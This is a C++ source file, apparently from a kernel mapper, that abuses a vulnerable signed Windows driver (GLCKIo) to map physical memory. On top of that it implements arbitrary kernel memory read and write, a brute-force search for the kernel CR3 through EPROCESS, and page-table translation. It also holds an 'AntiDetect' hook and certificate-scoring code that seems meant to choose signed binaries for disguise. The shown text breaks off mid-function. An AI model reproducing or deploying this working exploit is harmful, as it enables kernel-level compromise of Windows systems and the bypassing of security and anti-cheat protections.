#include "Mapper.h"
#include <SetupAPI.h>
#include <devguid.h>
#include <initguid.h>
#include <cfgmgr32.h>
#include <TlHelp32.h>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>
#include <mscat.h>
#include <string>

#pragma comment(lib, "setupapi.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "crypt32.lib")

DEFINE_GUID(GUID_DEVINTERFACE_GIO,
    0x70a35746, 0x5d4c, 0x4d58, 0xb6, 0xc5, 0xc6, 0xef, 0x26, 0xf6, 0x4e, 0x7e);

DEFINE_GUID(GUID_DEVINTERFACE_GIO_ALT,
    0x4d36e97d, 0xe325, 0x11ce, 0xbf, 0xc1, 0x08, 0x00, 0x2b, 0xe1, 0x03, 0x18);

namespace VulnDriver {

    static const wchar_t* DeviceNames[] = {
        L"\\??\\GLCKIo",
        L"\\Device\\GLCKIo",
        L"\\DosDevices\\GLCKIo"
    };

    static BOOL TryOpenDeviceInterface(const GUID* interfaceGuid, PHANDLE deviceHandle) {
        HDEVINFO deviceInfoSet = SetupDiGetClassDevsW(
            interfaceGuid,
            nullptr,
            nullptr,
            DIGCF_PRESENT | DIGCF_DEVICEINTERFACE
        );

        if (deviceInfoSet == INVALID_HANDLE_VALUE) {
            return FALSE;
        }

        SP_DEVICE_INTERFACE_DATA interfaceData = { 0 };
        interfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

        for (DWORD index = 0; SetupDiEnumDeviceInterfaces(deviceInfoSet, nullptr, interfaceGuid, index, &interfaceData); index++) {
            DWORD requiredSize = 0;
            SetupDiGetDeviceInterfaceDetailW(deviceInfoSet, &interfaceData, nullptr, 0, &requiredSize, nullptr);

            if (requiredSize == 0) continue;

            PSP_DEVICE_INTERFACE_DETAIL_DATA_W detailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)HeapAlloc(
                GetProcessHeap(), HEAP_ZERO_MEMORY, requiredSize);

            if (!detailData) continue;

            detailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);

            if (SetupDiGetDeviceInterfaceDetailW(deviceInfoSet, &interfaceData, detailData, requiredSize, nullptr, nullptr)) {
                HANDLE hDevice = CreateFileW(
                    detailData->DevicePath,
                    GENERIC_READ | GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                    nullptr,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    nullptr
                );

                HeapFree(GetProcessHeap(), 0, detailData);

                if (hDevice != INVALID_HANDLE_VALUE) {
                    SetupDiDestroyDeviceInfoList(deviceInfoSet);
                    *deviceHandle = hDevice;
                    return TRUE;
                }
            } else {
                HeapFree(GetProcessHeap(), 0, detailData);
            }
        }

        SetupDiDestroyDeviceInfoList(deviceInfoSet);
        return FALSE;
    }

    static BOOL TryOpenViaCfgMgr(PHANDLE deviceHandle) {
        const GUID* guidsToTry[] = {
            &GUID_DEVINTERFACE_GIO,
            &GUID_DEVINTERFACE_GIO_ALT,
            &GUID_DEVCLASS_SYSTEM
        };

        for (int g = 0; g < sizeof(guidsToTry) / sizeof(guidsToTry[0]); g++) {
            ULONG bufferLen = 0;
            CONFIGRET cr = CM_Get_Device_Interface_List_SizeW(
                &bufferLen,
                const_cast<LPGUID>(guidsToTry[g]),
                nullptr,
                CM_GET_DEVICE_INTERFACE_LIST_PRESENT
            );

            if (cr != CR_SUCCESS || bufferLen <= 1) continue;

            PWSTR deviceList = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLen * sizeof(WCHAR));
            if (!deviceList) continue;

            cr = CM_Get_Device_Interface_ListW(
                const_cast<LPGUID>(guidsToTry[g]),
                nullptr,
                deviceList,
                bufferLen,
                CM_GET_DEVICE_INTERFACE_LIST_PRESENT
            );

            if (cr == CR_SUCCESS) {
                for (PWSTR current = deviceList; *current; current += wcslen(current) + 1) {
                    if (wcsstr(current, L"GLCK") || wcsstr(current, L"glck") ||
                        wcsstr(current, L"GLCKIo") || wcsstr(current, L"glckio")) {
                        HANDLE hDevice = CreateFileW(
                            current,
                            GENERIC_READ | GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            nullptr,
                            OPEN_EXISTING,
                            FILE_ATTRIBUTE_NORMAL,
                            nullptr
                        );

                        if (hDevice != INVALID_HANDLE_VALUE) {
                            HeapFree(GetProcessHeap(), 0, deviceList);
                            *deviceHandle = hDevice;
                            return TRUE;
                        }
                    }
                }
            }

            HeapFree(GetProcessHeap(), 0, deviceList);
        }

        return FALSE;
    }

    NTSTATUS OpenDevice(PHANDLE deviceHandle) {
        if (!deviceHandle) {
            return STATUS_INVALID_PARAMETER;
        }

        *deviceHandle = nullptr;

        if (TryOpenDeviceInterface(&GUID_DEVINTERFACE_GIO, deviceHandle)) {
            return STATUS_SUCCESS;
        }

        if (TryOpenDeviceInterface(&GUID_DEVINTERFACE_GIO_ALT, deviceHandle)) {
            return STATUS_SUCCESS;
        }

        if (TryOpenViaCfgMgr(deviceHandle)) {
            return STATUS_SUCCESS;
        }

        NTSTATUS lastStatus = STATUS_OBJECT_NAME_NOT_FOUND;

        for (int i = 0; i < sizeof(DeviceNames) / sizeof(DeviceNames[0]); i++) {
            UNICODE_STRING deviceName;
            USHORT len = static_cast<USHORT>(wcslen(DeviceNames[i]) * sizeof(wchar_t));
            deviceName.Length = len;
            deviceName.MaximumLength = len + sizeof(wchar_t);
            deviceName.Buffer = const_cast<PWSTR>(DeviceNames[i]);

            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, &deviceName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

            IO_STATUS_BLOCK ioStatus = { 0 };

            NTSTATUS status = NtCreateFile(
                deviceHandle,
                SYNCHRONIZE | FILE_READ_DATA | FILE_WRITE_DATA,
                &objAttr,
                &ioStatus,
                nullptr,
                FILE_ATTRIBUTE_NORMAL,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                FILE_OPEN,
                FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
                nullptr,
                0
            );

            lastStatus = status;

            if (NT_SUCCESS(status)) {
                return status;
            }
        }

        return lastStatus;
    }

    static constexpr int MAP_CACHE_SIZE = 8;
    static WINIO_PHYS_MEM g_MapCache[MAP_CACHE_SIZE] = {};
    static int g_MapCacheCount = 0;

    static void CacheMapResult(const WINIO_PHYS_MEM& result) {
        if (g_MapCacheCount < MAP_CACHE_SIZE) {
            g_MapCache[g_MapCacheCount++] = result;
        } else {
            g_MapCache[MAP_CACHE_SIZE - 1] = result;
        }
    }

    static WINIO_PHYS_MEM* FindCachedMap(PVOID mappedAddr) {
        for (int i = 0; i < g_MapCacheCount; i++) {
            if (g_MapCache[i].MappedAddress == mappedAddr) {
                return &g_MapCache[i];
            }
        }
        return nullptr;
    }

    static void RemoveCachedMap(PVOID mappedAddr) {
        for (int i = 0; i < g_MapCacheCount; i++) {
            if (g_MapCache[i].MappedAddress == mappedAddr) {
                for (int j = i; j < g_MapCacheCount - 1; j++) {
                    g_MapCache[j] = g_MapCache[j + 1];
                }
                g_MapCacheCount--;
                memset(&g_MapCache[g_MapCacheCount], 0, sizeof(WINIO_PHYS_MEM));
                return;
            }
        }
    }

    NTSTATUS MapPhysicalMemory(HANDLE device, ULONGLONG physAddr, ULONG size, PVOID* mappedAddr) {

        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            return STATUS_INVALID_HANDLE;
        }
        if (!mappedAddr || size == 0) {
            return STATUS_INVALID_PARAMETER;
        }

        WINIO_PHYS_MEM ioData = { 0 };
        ioData.Size.QuadPart = static_cast<LONGLONG>(size);
        ioData.PhysicalAddress.QuadPart = static_cast<LONGLONG>(physAddr);
        ioData.SectionHandle = nullptr;
        ioData.MappedAddress = nullptr;
        ioData.SectionObject = nullptr;

        IO_STATUS_BLOCK ioStatus = { 0 };

        NTSTATUS status = NtDeviceIoControlFilePtr(
            device,
            nullptr,
            nullptr,
            nullptr,
            &ioStatus,
            IOCTL_WINIO_MAPPHYSTOLIN,
            &ioData,
            sizeof(ioData),
            &ioData,
            sizeof(ioData)
        );

        if (NT_SUCCESS(status) && ioData.MappedAddress != nullptr) {
            *mappedAddr = ioData.MappedAddress;
            CacheMapResult(ioData);
        } else {
            if (NT_SUCCESS(status)) {
                status = STATUS_UNSUCCESSFUL;
            }
        }

        return status;
    }

    NTSTATUS UnmapPhysicalMemory(HANDLE device, PVOID mappedAddr) {

        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            return STATUS_INVALID_HANDLE;
        }
        if (!mappedAddr) {
            return STATUS_INVALID_PARAMETER;
        }

        WINIO_PHYS_UNMAP ioData = { 0 };
        WINIO_PHYS_MEM* cached = FindCachedMap(mappedAddr);
        if (cached) {
            ioData.Size = cached->Size;
            ioData.PhysicalAddress = cached->PhysicalAddress;
            ioData.SectionHandle = cached->SectionHandle;
            ioData.MappedAddress = cached->MappedAddress;
            ioData.SectionObject = cached->SectionObject;
        } else {
            ioData.MappedAddress = mappedAddr;
            ioData.SectionHandle = nullptr;
            ioData.SectionObject = nullptr;
        }

        IO_STATUS_BLOCK ioStatus = { 0 };

        NTSTATUS status = NtDeviceIoControlFilePtr(
            device,
            nullptr,
            nullptr,
            nullptr,
            &ioStatus,
            IOCTL_WINIO_UNMAPPHYSADDR,
            &ioData,
            sizeof(ioData),
            &ioData,
            sizeof(ioData)
        );

        RemoveCachedMap(mappedAddr);

        return status;
    }

    NTSTATUS ReadPhysicalMemory(HANDLE device, ULONGLONG physAddr, PVOID buffer, SIZE_T size) {
        if (!buffer || size == 0) {
            return STATUS_INVALID_PARAMETER;
        }

        PVOID mapped = nullptr;
        ULONG mapSize = static_cast<ULONG>((size + 0xFFF) & ~0xFFF);

        NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, mapSize, &mapped);
        if (!NT_SUCCESS(status)) {
            return status;
        }

        __try {
            ULONG offset = static_cast<ULONG>(physAddr & 0xFFF);
            memcpy(buffer, (PUCHAR)mapped + offset, size);
            AntiDetect::MemoryBarrier();
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            UnmapPhysicalMemory(device, mapped);
            return STATUS_ACCESS_VIOLATION;
        }

        UnmapPhysicalMemory(device, mapped);
        return STATUS_SUCCESS;
    }

    NTSTATUS WritePhysicalMemory(HANDLE device, ULONGLONG physAddr, PVOID data, SIZE_T size) {
        if (!data || size == 0) {
            return STATUS_INVALID_PARAMETER;
        }

        PVOID mapped = nullptr;
        ULONG mapSize = static_cast<ULONG>((size + 0xFFF) & ~0xFFF);

        NTSTATUS status = MapPhysicalMemory(device, physAddr & ~0xFFFULL, mapSize, &mapped);
        if (!NT_SUCCESS(status)) {
            return status;
        }

        __try {
            ULONG offset = static_cast<ULONG>(physAddr & 0xFFF);
            memcpy((PUCHAR)mapped + offset, data, size);
            AntiDetect::MemoryBarrier();
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            UnmapPhysicalMemory(device, mapped);
            return STATUS_ACCESS_VIOLATION;
        }

        UnmapPhysicalMemory(device, mapped);
        return STATUS_SUCCESS;
    }

    static ULONGLONG g_KernelCR3 = 0;
    static ULONGLONG g_NtoskrnlBase = 0;

    static ULONGLONG VirtualToPhysicalWithCR3(HANDLE device, ULONGLONG cr3, ULONGLONG va) {
        ULONGLONG pml4Index = (va >> 39) & 0x1FF;
        ULONGLONG pdptIndex = (va >> 30) & 0x1FF;
        ULONGLONG pdIndex = (va >> 21) & 0x1FF;
        ULONGLONG ptIndex = (va >> 12) & 0x1FF;
        ULONGLONG pageOffset = va & 0xFFF;

        ULONGLONG pml4e = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, cr3 + pml4Index * 8, &pml4e, sizeof(pml4e)))) {
            return 0;
        }
        if (!(pml4e & 1)) {
            return 0;
        }

        ULONGLONG pdptPhys = pml4e & 0xFFFFFFFFF000ULL;
        ULONGLONG pdpte = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, pdptPhys + pdptIndex * 8, &pdpte, sizeof(pdpte)))) {
            return 0;
        }
        if (!(pdpte & 1)) {
            return 0;
        }
        if (pdpte & 0x80) {
            return (pdpte & 0xFFFFFFC0000000ULL) + (va & 0x3FFFFFFF);
        }

        ULONGLONG pdPhys = pdpte & 0xFFFFFFFFF000ULL;
        ULONGLONG pde = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, pdPhys + pdIndex * 8, &pde, sizeof(pde)))) {
            return 0;
        }
        if (!(pde & 1)) {
            return 0;
        }
        if (pde & 0x80) {
            return (pde & 0xFFFFFFFE00000ULL) + (va & 0x1FFFFF);
        }

        ULONGLONG ptPhys = pde & 0xFFFFFFFFF000ULL;
        ULONGLONG pte = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, ptPhys + ptIndex * 8, &pte, sizeof(pte)))) {
            return 0;
        }
        if (!(pte & 1)) {
            return 0;
        }

        return (pte & 0xFFFFFFFFF000ULL) + pageOffset;
    }

    static BOOL VerifyCR3Candidate(HANDLE device, ULONGLONG cr3Candidate, ULONGLONG ntoskrnlVA) {
        if (ntoskrnlVA == 0) {
            return FALSE;
        }

        ULONGLONG physAddr = VirtualToPhysicalWithCR3(device, cr3Candidate, ntoskrnlVA);
        if (physAddr == 0) {
            return FALSE;
        }

        UCHAR mzHeader[2] = { 0 };
        if (!NT_SUCCESS(ReadPhysicalMemory(device, physAddr, mzHeader, 2))) {
            return FALSE;
        }

        if (mzHeader[0] == 0x4D && mzHeader[1] == 0x5A) {
            return TRUE;
        }

        return FALSE;
    }

    static ULONGLONG GetKernelCR3FromEPROCESS(HANDLE device, ULONGLONG ntoskrnlBase) {
        PVOID pPsInitialSystemProcess = KernelUtils::GetKernelProcAddress(
            (PVOID)ntoskrnlBase, "PsInitialSystemProcess");

        if (!pPsInitialSystemProcess) {
            return 0;
        }

        static const ULONGLONG lowCR3Candidates[] = {
            0x1AD000, 0x1AB000, 0x1A9000, 0x1A7000,
            0x1B0000, 0x1B2000, 0x1B4000, 0x1B6000,
            0x100000, 0x102000, 0x104000, 0x106000,
            0x180000, 0x182000, 0x184000, 0x186000,
            0x200000, 0x202000, 0x204000, 0x206000,
            0x300000, 0x400000, 0x500000, 0x600000
        };

        for (int i = 0; i < sizeof(lowCR3Candidates) / sizeof(lowCR3Candidates[0]); i++) {
            ULONGLONG testCR3 = lowCR3Candidates[i];

            ULONGLONG physPsInit = VirtualToPhysicalWithCR3(device, testCR3, (ULONGLONG)pPsInitialSystemProcess);
            if (physPsInit == 0) {
                continue;
            }

            ULONGLONG systemEprocess = 0;
            if (!NT_SUCCESS(ReadPhysicalMemory(device, physPsInit, &systemEprocess, sizeof(systemEprocess)))) {
                continue;
            }

            if (systemEprocess == 0 || (systemEprocess & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
                continue;
            }

            ULONGLONG physEprocess = VirtualToPhysicalWithCR3(device, testCR3, systemEprocess);
            if (physEprocess == 0) {
                continue;
            }

            ULONGLONG dtb = 0;
            if (!NT_SUCCESS(ReadPhysicalMemory(device, physEprocess + 0x28, &dtb, sizeof(dtb)))) {
                continue;
            }

            dtb &= ~0xFFFULL;

            if (dtb == 0 || dtb > 0x800000000ULL) {
                continue;
            }

            if (VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
                return dtb;
            }
        }

        for (ULONGLONG testCR3 = 0x100000; testCR3 < 0x10000000; testCR3 += 0x1000) {
            ULONGLONG physPsInit = VirtualToPhysicalWithCR3(device, testCR3, (ULONGLONG)pPsInitialSystemProcess);
            if (physPsInit == 0) {
                continue;
            }

            ULONGLONG systemEprocess = 0;
            if (!NT_SUCCESS(ReadPhysicalMemory(device, physPsInit, &systemEprocess, sizeof(systemEprocess)))) {
                continue;
            }

            if (systemEprocess == 0 || (systemEprocess & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL) {
                continue;
            }

            ULONGLONG physEprocess = VirtualToPhysicalWithCR3(device, testCR3, systemEprocess);
            if (physEprocess == 0) {
                continue;
            }

            ULONGLONG dtb = 0;
            if (!NT_SUCCESS(ReadPhysicalMemory(device, physEprocess + 0x28, &dtb, sizeof(dtb)))) {
                continue;
            }

            dtb &= ~0xFFFULL;

            if (dtb == 0 || dtb > 0x800000000ULL) {
                continue;
            }

            if (VerifyCR3Candidate(device, dtb, ntoskrnlBase)) {
                return dtb;
            }
        }

        return 0;
    }

    static ULONGLONG FindKernelCR3(HANDLE device, ULONGLONG ntoskrnlBase) {
        ULONGLONG cr3 = GetKernelCR3FromEPROCESS(device, ntoskrnlBase);
        if (cr3 != 0) {
            return cr3;
        }

        return 0;
    }

    ULONGLONG VirtualToPhysical(HANDLE device, PVOID virtualAddress) {
        ULONGLONG va = (ULONGLONG)virtualAddress;

        ULONGLONG pml4Index = (va >> 39) & 0x1FF;
        ULONGLONG pdptIndex = (va >> 30) & 0x1FF;
        ULONGLONG pdIndex = (va >> 21) & 0x1FF;
        ULONGLONG ptIndex = (va >> 12) & 0x1FF;
        ULONGLONG pageOffset = va & 0xFFF;

        if (g_KernelCR3 == 0) {
            if (g_NtoskrnlBase == 0) {
                g_NtoskrnlBase = (ULONGLONG)KernelUtils::GetKernelModuleBase("ntoskrnl.exe");
            }
            g_KernelCR3 = FindKernelCR3(device, g_NtoskrnlBase);
            if (g_KernelCR3 == 0) {
                return 0;
            }
        }

        ULONGLONG pml4e = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, g_KernelCR3 + pml4Index * 8, &pml4e, sizeof(pml4e)))) {
            return 0;
        }
        if (!(pml4e & 1)) {
            return 0;
        }

        ULONGLONG pdptPhys = pml4e & 0xFFFFFFFFF000ULL;
        ULONGLONG pdpte = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, pdptPhys + pdptIndex * 8, &pdpte, sizeof(pdpte)))) {
            return 0;
        }
        if (!(pdpte & 1)) {
            return 0;
        }
        if (pdpte & 0x80) {
            ULONGLONG result = (pdpte & 0xFFFFFFC0000000ULL) + (va & 0x3FFFFFFF);
            return result;
        }

        ULONGLONG pdPhys = pdpte & 0xFFFFFFFFF000ULL;
        ULONGLONG pde = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, pdPhys + pdIndex * 8, &pde, sizeof(pde)))) {
            return 0;
        }
        if (!(pde & 1)) {
            return 0;
        }
        if (pde & 0x80) {
            ULONGLONG result = (pde & 0xFFFFFFFE00000ULL) + (va & 0x1FFFFF);
            return result;
        }

        ULONGLONG ptPhys = pde & 0xFFFFFFFFF000ULL;
        ULONGLONG pte = 0;
        if (!NT_SUCCESS(ReadPhysicalMemory(device, ptPhys + ptIndex * 8, &pte, sizeof(pte)))) {
            return 0;
        }
        if (!(pte & 1)) {
            return 0;
        }

        ULONGLONG result = (pte & 0xFFFFFFFFF000ULL) + pageOffset;
        return result;
    }

    NTSTATUS ReadKernelMemory(HANDLE device, PVOID address, PVOID buffer, SIZE_T size) {
        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            return STATUS_INVALID_HANDLE;
        }
        if (!buffer || size == 0) {
            return STATUS_INVALID_PARAMETER;
        }

        ULONGLONG va = reinterpret_cast<ULONGLONG>(address);
        PUCHAR outBuf = static_cast<PUCHAR>(buffer);
        SIZE_T remaining = size;

        while (remaining > 0) {
            ULONGLONG pageOffset = va & 0xFFF;
            SIZE_T chunkSize = min(remaining, 0x1000 - static_cast<SIZE_T>(pageOffset));

            ULONGLONG physAddr = VirtualToPhysical(device, reinterpret_cast<PVOID>(va));
            if (physAddr == 0) {
                return STATUS_UNSUCCESSFUL;
            }

            NTSTATUS status = ReadPhysicalMemory(device, physAddr, outBuf, chunkSize);
            if (!NT_SUCCESS(status)) {
                return status;
            }

            va += chunkSize;
            outBuf += chunkSize;
            remaining -= chunkSize;
        }

        return STATUS_SUCCESS;
    }

    NTSTATUS WriteKernelMemory(HANDLE device, PVOID address, PVOID data, SIZE_T size) {
        if (device == nullptr || device == INVALID_HANDLE_VALUE) {
            return STATUS_INVALID_HANDLE;
        }
        if (!data || size == 0) {
            return STATUS_INVALID_PARAMETER;
        }

        ULONGLONG va = reinterpret_cast<ULONGLONG>(address);
        PUCHAR inBuf = static_cast<PUCHAR>(data);
        SIZE_T remaining = size;

        while (remaining > 0) {
            ULONGLONG pageOffset = va & 0xFFF;
            SIZE_T chunkSize = min(remaining, 0x1000 - static_cast<SIZE_T>(pageOffset));

            ULONGLONG physAddr = VirtualToPhysical(device, reinterpret_cast<PVOID>(va));
            if (physAddr == 0) {
                return STATUS_UNSUCCESSFUL;
            }

            NTSTATUS status = WritePhysicalMemory(device, physAddr, inBuf, chunkSize);
            if (!NT_SUCCESS(status)) {
                return status;
            }

            va += chunkSize;
            inBuf += chunkSize;
            remaining -= chunkSize;
        }

        return STATUS_SUCCESS;
    }

    NTSTATUS ReadMsr(HANDLE device, ULONG msrIndex, PULONGLONG value) {
        (void)device;
        (void)msrIndex;
        (void)value;
        return STATUS_NOT_SUPPORTED;
    }

    NTSTATUS WriteMsr(HANDLE device, ULONG msrIndex, ULONGLONG value) {
        (void)device;
        (void)msrIndex;
        (void)value;
        return STATUS_NOT_SUPPORTED;
    }

    VOID ResetCR3Cache() {
        g_KernelCR3 = 0;
        g_NtoskrnlBase = 0;
    }

    VOID CloseDevice(HANDLE deviceHandle) {
        if (deviceHandle && deviceHandle != INVALID_HANDLE_VALUE) {
            NtClose(deviceHandle);
        }
    }

}

namespace SignedMemory {

    struct CERT_BUFFER {
        BYTE* Data;
        DWORD Size;
    };

    static const char* g_EVPolicyOIDs[] = {
        "2.23.140.1.1",
        "2.23.140.1.3",
        "2.23.140.1.4.1",
        "1.3.6.1.4.1.311.94.1.1",
        "2.16.840.1.114414.1.7.23.3",
        "2.16.840.1.113733.1.7.23.6",
        "2.16.840.1.113733.1.7.48.1",
        "1.3.6.1.4.1.6449.2.1.1",
        "1.3.6.1.4.1.6449.1.2.1.5.1",
        "1.3.6.1.4.1.44947.1.1.1",
        "2.16.840.1.114028.10.1.2",
        "1.3.6.1.4.1.14370.1.6",
        "1.3.6.1.4.1.4788.2.202.1",
        "2.16.840.1.114413.1.7.23.3",
        "1.3.6.1.4.1.8024.0.2.100.1.2",
        "2.16.756.1.89.1.2.1.1",
        "2.16.840.1.114412.2.1",
        "2.16.840.1.114412.3.2",
        "1.3.6.1.4.1.4146.1.1",
        "1.2.616.1.113527.2.5.1.1",
        "1.3.171.1.1.10.5.2",
        "1.3.6.1.4.1.34697.2.1",
        "1.3.6.1.4.1.40869.1.1.22.3",
        "2.16.840.1.114171.500.9",
        "2.16.578.1.26.1.3.3",
        "1.3.6.1.4.1.17326.10.14.2.1.2",
        "1.3.6.1.4.1.22234.2.5.2.3.1",
        "2.16.840.1.114404.1.1.2.4.1",
        "1.3.6.1.4.1.23223.1.1.1",
    };

    static BOOL ExtractCertificateData(LPCWSTR filePath, CERT_BUFFER* outCert) {
        if (!filePath || !outCert) return FALSE;
        outCert->Data = nullptr;
        outCert->Size = 0;

        HANDLE hFile = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return FALSE;

        DWORD fileSize = GetFileSize(hFile, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize < 4096) {
            CloseHandle(hFile);
            return FALSE;
        }

        BYTE* fileData = (BYTE*)VirtualAlloc(nullptr, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!fileData) {
            CloseHandle(hFile);
            return FALSE;
        }

        DWORD bytesRead = 0;
        if (!ReadFile(hFile, fileData, fileSize, &bytesRead, nullptr) || bytesRead != fileSize) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            CloseHandle(hFile);
            return FALSE;
        }
        CloseHandle(hFile);

        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fileData;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > fileSize) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(fileData + dos->e_lfanew);
        if (ntHdr->Signature != IMAGE_NT_SIGNATURE) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        IMAGE_DATA_DIRECTORY secDir = {};
        if (ntHdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
            PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)ntHdr;
            if (nt64->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) {
                VirtualFree(fileData, 0, MEM_RELEASE);
                return FALSE;
            }
            secDir = nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
        } else if (ntHdr->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
            PIMAGE_NT_HEADERS32 nt32 = (PIMAGE_NT_HEADERS32)ntHdr;
            if (nt32->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) {
                VirtualFree(fileData, 0, MEM_RELEASE);
                return FALSE;
            }
            secDir = nt32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
        } else {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        if (secDir.VirtualAddress == 0 || secDir.Size < sizeof(WIN_CERTIFICATE) ||
            secDir.VirtualAddress + secDir.Size > fileSize) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        outCert->Data = (BYTE*)VirtualAlloc(nullptr, secDir.Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!outCert->Data) {
            VirtualFree(fileData, 0, MEM_RELEASE);
            return FALSE;
        }

        memcpy(outCert->Data, fileData + secDir.VirtualAddress, secDir.Size);
        outCert->Size = secDir.Size;

        VirtualFree(fileData, 0, MEM_RELEASE);
        return TRUE;
    }

    static int ScoreDriverCertificate(LPCWSTR filePath) {
        // MUST VERIFY EMBEDDED SIGNATURE
        // We refuse to select catalog-signed drivers. Catalog signatures don't travel with copied files,
        // which prevents the "Digital Signatures" tab from appearing in Explorer.
        DWORD dwEncoding = 0, dwContentType = 0, dwFormatType = 0;
        HCERTSTORE hStore = NULL;
        HCRYPTMSG hMsg = NULL;

        BOOL hasEmbeddedSignature = CryptQueryObject(
            CERT_QUERY_OBJECT_FILE,
            filePath,
            CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
            CERT_QUERY_FORMAT_FLAG_BINARY,
            0,
            &dwEncoding,
            &dwContentType,
            &dwFormatType,
            &hStore,
            &hMsg,
            NULL
        );

        if (!hasEmbeddedSignature) {
            return 0; // REJECT: Missing embedded PKCS#7 signature
        }

        if (hStore) CertCloseStore(hStore, 0);
        if (hMsg) CryptMsgClose(hMsg);

        int score = 1;

        WINTRUST_FILE_INFO fileInfo = {};
        fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
        fileInfo.pcwszFilePath = filePath;

        GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;

        WINTRUST_DATA trustData = {};
        trustData.cbStruct = sizeof(WINTRUST_DATA);
        trustData.dwUIChoice = WTD_UI_NONE;
        trustData.fdwRevocationChecks = WTD_REVOKE_NONE;
        trustData.dwUnionChoice = WTD_CHOICE_FILE;
        trustData.pFile = &fileInfo;
        trustData.dwStateAction = WTD_STATEACTION_VERIFY;
        trustData.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

        LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &trustData);

        if (lStatus == ERROR_SUCCESS) {
            score += 200;
        } else if (lStatus == (LONG)CERT_E_EXPIRED) {
            score += 50;
        } else if (lStatus == (LONG)CERT_E_UNTRUSTEDROOT || lStatus == (LONG)CRYPT_E_SECURITY_SETTINGS) {
            score += 10;
        }

        if (trustData.hWVTStateData) {
            CRYPT_PROVIDER_DATA* prov = WTHelperProvDataFromStateData(trustData.hWVTStateData);
            if (prov) {
                CRYPT_PROVIDER_SGNR* sgnr = WTHelperGetProvSignerFromChain(prov, 0, FALSE, 0);
                if (sgnr) {
                    if (sgnr->csCounterSigners > 0) {
                        score += 50;
                        CRYPT_PROVIDER_SGNR* csSgnr = WTHelperGetProvSignerFromChain(prov, 0, TRUE, 0);
                        if (csSgnr && csSgnr->pChainContext && csSgnr->pChainContext->cChain > 0) {
                            CERT_SIMPLE_CHAIN* csChain = csSgnr->pChainContext->rgpChain[0];
                            if (csChain->cElement > 0) {
                                PCCERT_CONTEXT csCert = csChain->rgpElement[0]->pCertContext;
                                FILETIME now;
                                GetSystemTimeAsFileTime(&now);
                                if (CompareFileTime(&now, &csCert->pCertInfo->NotAfter) < 0) {
                                    score += 100;
                                }
                            }
                        }
                    }

                    if (sgnr->pChainContext) {
                        for (DWORD c = 0; c < sgnr->pChainContext->cChain; c++) {
                            CERT_SIMPLE_CHAIN* chain = sgnr->pChainContext->rgpChain[c];
                            for (DWORD e = 0; e < chain->cElement; e++) {
                                PCCERT_CONTEXT cert = chain->rgpElement[e]->pCertContext;
                                FILETIME ftNow;
                                GetSystemTimeAsFileTime(&ftNow);
                                if (CompareFileTime(&ftNow, &cert->pCertInfo->NotAfter) < 0 &&
                                    CompareFileTime(&ftNow, &cert->pCertInfo->NotBefore) > 0) {
